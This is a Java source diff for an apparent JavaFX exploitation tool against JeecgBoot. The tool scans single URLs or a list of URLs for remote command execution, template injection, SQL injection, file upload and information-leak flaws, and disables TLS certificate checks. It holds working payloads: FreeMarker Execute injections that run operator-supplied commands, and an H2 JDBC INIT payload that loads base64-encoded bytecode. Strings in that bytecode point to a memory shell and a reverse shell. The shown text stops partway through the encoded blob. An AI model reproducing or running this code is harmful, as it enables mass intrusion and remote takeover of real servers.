@@ -1,0 +1,2747 @@
+import javafx.concurrent.Task;
+import javafx.event.ActionEvent;
+import javafx.fxml.FXML;
+import javafx.scene.control.Alert;
+import javafx.scene.control.ComboBox;
+import javafx.scene.control.TextArea;
+import javafx.scene.control.TextField;
+import net.sf.json.JSONArray;
+import net.sf.json.JSONObject;
+import okhttp3.*;
+
+import javax.net.ssl.*;
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Random;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+public class ff {
+
+
+    @FXML
+    private ComboBox<String> comboBox;
+
+    @FXML
+    private ComboBox<String> comboBox1;
+
+    @FXML
+    private ComboBox<String> comboBox3;
+
+    @FXML
+    private ComboBox<String> comboBoxshell;
+
+    @FXML
+    private ComboBox<String> comboBoxdgfd;
+
+
+    @FXML
+    private TextField test1;
+
+    @FXML
+    private TextArea test2;
+
+    @FXML
+    private TextArea test3;
+
+
+    @FXML
+    private TextField cmd1;
+
+
+    @FXML
+    private TextArea testss;
+
+    @FXML
+    private TextField urldf;
+
+    @FXML
+    private TextField testdff;
+
+    @FXML
+    private TextField testdffd;
+
+    @FXML
+    private TextArea testdfdf;
+
+    @FXML
+    private TextField testjggj;
+
+    @FXML
+    private TextField dsffsf;
+
+    @FXML
+    private TextArea tedasfa;
+
+
+    @FXML
+    void jeecgxian(ActionEvent event) {
+        isRunning = false;
+
+    }
+
+    @FXML
+    void jeecgss(ActionEvent event) {
+        isRunning = true;
+    }
+
+    @FXML
+    void jeecggetshells(ActionEvent event) {
+
+        String selectedItem = comboBoxshell.getValue();
+
+
+        if ("all".equals(selectedItem)) {
+
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("拼写检查");
+            alert.setHeaderText("");
+            alert.setContentText("请选择模块！");
+            alert.showAndWait();
+        } else if ("jeecg-boot commonController 任意文件上传漏洞".equals(selectedItem)) {
+
+            jeecggskkl();
+
+
+        } else if ("jeecg-boot jmreport任意文件上传漏洞".equals(selectedItem)) {
+
+            jeecggetshelldf();
+        }
+
+    }
+
+
+    @FXML
+    void jeecggetshell(ActionEvent event) {
+
+        String selectedItem = comboBoxshell.getValue();
+
+
+        if ("all".equals(selectedItem)) {
+
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("拼写检查");
+            alert.setHeaderText("");
+            alert.setContentText("请选择模块！");
+            alert.showAndWait();
+        }
+        if ("jeecg-boot commonController 任意文件上传漏洞".equals(selectedItem)) {
+
+            jeecggskkl();
+
+
+        }
+    }
+
+    @FXML
+    void rce(ActionEvent event) {
+
+
+        String selectedItem = comboBox.getValue();
+
+
+        if ("选择模块".equals(selectedItem)) {
+
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("拼写检查");
+            alert.setHeaderText("");
+            alert.setContentText("请选择模块！");
+            alert.showAndWait();
+        }
+        if ("all".equals(selectedItem)) {
+
+            //   jeecgrce();
+
+            //  jeecgtest();
+
+            test2.clear();
+            zhiwen();
+            jeecgrce();
+            jeecgtest();
+            jeecgrcedfs();
+            jeecgdsd();
+            jeecggfg();
+            jeecgfgdg();
+            jeecggetshell();
+            jeecgipload();
+            jeecguser();
+            jeecgusergfhf();
+            jeecghttp();
+
+
+        } else if ("jeecg-boot queryFieldBySql远程命令执行漏洞".equals(selectedItem)) {
+
+
+            jeecgrce();
+
+            //     jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot testConnection远程命令执行漏洞".equals(selectedItem)) {
+
+
+            jeecgtest();
+
+            //  jeecgrce();
+        } else if ("JeecgBoot jmreport/loadTableData SSTI模板注入漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecgrcedfs();
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot-queryTableData-sqli注入漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecgdsd();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot-getDictItemsByTable-sqli注入漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecggfg();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("Jeecg-Boot qurestSql-SQL注入漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecgfgdg();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot commonController 任意文件上传漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecggetshell();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot-querySysUser信息泄露漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecguser();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot-checkOnlyUser信息泄露漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecgusergfhf();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot-httptrace信息泄露漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecghttp();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        } else if ("jeecg-boot jmreport任意文件上传漏洞".equals(selectedItem)) {
+            // test2.appendText("ok");
+            //jeecgrcedfs();
+            //      ssik();
+            jeecgipload();
+
+
+            //    jeecgtest();
+
+            //  jeecgrce();
+        }
+    }
+
+    @FXML
+    void jeecgjiekou(ActionEvent event) {
+
+
+        String selectedItem = comboBoxdgfd.getValue();
+        if ("all".equals(selectedItem)) {
+
+            jeecgqueryudfsdf();
+            jeecgdsfsfs();
+
+
+        } else if ("jeecg-boot-querySysUser信息泄露漏洞".equals(selectedItem)) {
+
+
+            jeecgqueryudfsdf();
+
+        } else if ("jeecg-boot-checkOnlyUser信息泄露漏洞".equals(selectedItem)) {
+
+            jeecgdsfsfs();
+
+
+        }
+    }
+
+
+    @FXML
+    void rce1(ActionEvent event) {
+        test2.clear();
+        testss.clear();
+        tedasfa.clear();
+    }
+
+    @FXML
+    void rce5(ActionEvent event) {
+
+        String selectedItem = comboBox3.getValue();
+
+
+        if ("All".equals(selectedItem)) {
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("拼写检查");
+            alert.setHeaderText("");
+            alert.setContentText("请选择模块！");
+            alert.showAndWait();
+
+        } else if ("jeecg-boot queryFieldBySql远程命令执行漏洞".equals(selectedItem)) {
+
+            yz();
+        } else if ("jeecg-boot testConnection远程命令执行漏洞".equals(selectedItem)) {
+
+            jeecgcmd();
+        } else if ("JeecgBoot jmreport/loadTableData SSTI模板注入漏洞".equals(selectedItem)) {
+
+            jeecgssicmd();
+        }
+
+    }
+
+    private volatile boolean isRunning = true;
+
+    @FXML
+    void rce2(ActionEvent event) {
+
+        String selectedItem = comboBox1.getValue();
+
+
+        if ("All".equals(selectedItem)) {
+            Alert alert = new Alert(Alert.AlertType.ERROR);
+            alert.setTitle("拼写检查");
+            alert.setHeaderText("");
+            alert.setContentText("请选择模块！");
+            alert.showAndWait();
+
+        } else if ("jeecg-boot testConnection远程命令执行漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择jeecg-boot testConnection远程命令执行漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            jeecgpl(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+                    }
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+
+        } else if ("jeecg-boot queryFieldBySql远程命令执行漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择jeecg-boot queryFieldBySql远程命令执行漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            pl(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+                    }
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+        } else if ("JeecgBoot jmreport/loadTableData SSTI模板注入漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            ssi(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+
+                    }
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+        } else if ("jeecg-boot-queryTableData-sqli注入漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择jeecg-boot-queryTableData-sqli注入漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            jeecgquery(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+
+
+                    }
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+        } else if ("jeecg-boot-getDictItemsByTable-sqli注入漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择jeecg-boot-getDictItemsByTable-sqli注入漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            jeecgsql(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+
+                    }
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+        } else if ("Jeecg-Boot qurestSql-SQL注入漏洞".equals(selectedItem)) {
+
+            test3.appendText("正在开始批量检查,已选择Jeecg-Boot qurestSql-SQL注入漏洞" + "\n");
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    List<String> lines = readTextFile("urls.txt");
+                    for (String line : lines) {
+                        if (isRunning) {
+                            jeecgsq(line);
+                            Thread.sleep(1000);
+                        } else {
+
+                            break;
+                        }
+
+                    }
+
+                    return null;
+                }
+            };
+
+            new Thread(task).start();
+
+        }
+
+
+    }
+
+    private boolean isValidUrl(String url) {
+
+        String urlRegex = "^(http|https)://[^\\s]*$";
+        return url.matches(urlRegex);
+
+    }
+
+    public void jeecgrce() {
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        } else {
+
+
+            try {
+
+
+                HostnameVerifier hv = new HostnameVerifier() {
+                    @Override
+                    public boolean verify(String urlHostName, SSLSession session) {
+                        return true;
+                    }
+                };
+
+                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+                SSLContext sc = SSLContext.getInstance("SSL");
+                SSLSessionContext sslsc = sc.getServerSessionContext();
+                sslsc.setSessionTimeout(0);
+                sc.init(null, trustAllCerts, null);
+                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+                HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jeecg-boot/jmreport/queryFieldBySql");
+                String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
+                writer.write(json);
+                writer.close();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+                }
+
+                int responseCode = connection.getResponseCode();
+
+                //    String jsonStr = response.toString();
+                //   JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+                //   JSONObject result = (JSONObject) jsonObject.get("result");
+                ///   JSONArray fieldList = (JSONArray) result.get("fieldList");
+                //   for (Object field : fieldList) {
+                //      if (field instanceof JSONObject) {
+                //         JSONObject fieldObject = (JSONObject) field;
+
+                //       String fieldName = (String) fieldObject.get("fieldName");
+                //    System.out.println("fieldName: " + fieldName);
+
+                //  }
+                //   }
+
+
+                if (response.toString().contains("86756755")) {
+
+
+                    test2.appendText(formattedDateTime + url + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+                    //      test2.appendText(fieldName.toString() + "\n");
+
+
+                }
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-" + "\n");
+                //     System.out.println(e);
+
+            }
+
+
+        }
+    }
+
+    public void pl(String line) {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+            // System.setProperty("http.proxyHost", "127.0.0.1");
+            //   System.setProperty("http.proxyPort", "8080");
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            URL url1 = new URL(line + "/jeecg-boot/jmreport/queryFieldBySql");
+            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+            //    test1.appendText(response.toString());
+            if (response.toString().contains("86756755")) {
+
+                test3.appendText(formattedDateTime + line + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+
+
+            }
+            {
+                {
+
+                    //     test3.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+                }
+            }
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  test3.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-" + "\n");
+        }
+
+
+    }
+
+
+    private List<String> readTextFile(String filePath) {
+        List<String> lines = new ArrayList<>();
+        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                lines.add(line);
+            }
+        } catch (IOException e) {
+            //  e.printStackTrace();
+        }
+        return lines;
+    }
+
+    public void yz() {
+
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+        //      if (!isValidUrl(url)) test1.appendText("输入的不是有效的网址" + "\n");
+        else {
+            // if (!isValidUrl(url)) {
+            //       test1.appendText("输入的不是有效的网址" + "\n");
+            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
+            //  } else {
+
+
+            try {
+                //  System.setProperty("http.proxyHost", "127.0.0.1");
+                //    System.setProperty("http.proxyPort", "8080");
+
+                HostnameVerifier hv = new HostnameVerifier() {
+                    @Override
+                    public boolean verify(String urlHostName, SSLSession session) {
+                        return true;
+                    }
+                };
+
+                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+                SSLContext sc = SSLContext.getInstance("SSL");
+                SSLSessionContext sslsc = sc.getServerSessionContext();
+                sslsc.setSessionTimeout(0);
+                sc.init(null, trustAllCerts, null);
+                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+                HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jeecg-boot/jmreport/queryFieldBySql");
+                String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"" + cmd1.getText() + "\\\") }' \"}";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStream os = connection.getOutputStream();
+                os.write(input, 0, input.length);
+                os.flush();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+
+
+                }
+
+
+                String jsonStr = response.toString();
+                JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+                JSONObject result = (JSONObject) jsonObject.get("result");
+                JSONArray fieldList = (JSONArray) result.get("fieldList");
+                for (Object field : fieldList) {
+                    if (field instanceof JSONObject) {
+                        JSONObject fieldObject = (JSONObject) field;
+
+                        String fieldName = (String) fieldObject.get("fieldName");
+                        //     System.out.println("fieldName: " + fieldName);
+
+                        testss.appendText(fieldName.toString()
+
+                                + "\n");
+
+
+                    }
+
+
+                }
+
+
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                testss.appendText(formattedDateTime + url + "命令执行失败" + "\n");
+                //     System.out.println(e);
+
+            }
+        }
+
+    }
+
+    public void jeecgtest() {
+
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+        if (!isValidUrl(url))
+
+            test2.appendText("输入的不是有效的网址" + "\n");
+
+        else {
+
+
+            // if (!isValidUrl(url)) {
+            //       test1.appendText("输入的不是有效的网址" + "\n");
+            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
+            //  } else {
+
+
+            try {
+                //  System.setProperty("http.proxyHost", "127.0.0.1");
+                //    System.setProperty("http.proxyPort", "8080");
+
+                HostnameVerifier hv = new HostnameVerifier() {
+                    @Override
+                    public boolean verify(String urlHostName, SSLSession session) {
+                        return true;
+                    }
+                };
+
+                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+                SSLContext sc = SSLContext.getInstance("SSL");
+                SSLSessionContext sslsc = sc.getServerSessionContext();
+                sslsc.setSessionTimeout(0);
+                sc.init(null, trustAllCerts, null);
+                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+                HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jmreport/testConnection");
+                String json = "{\n" +
+                        "          \"id\":\"1\",\n" +
+                        "          \"code\":\"ABC\",\n" +
+                        "          \"dbType\":\"MySQL\",\n" +
+                        "          \"dbDriver\":\"org.h2.Driver\",\n" +
+                        "          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbG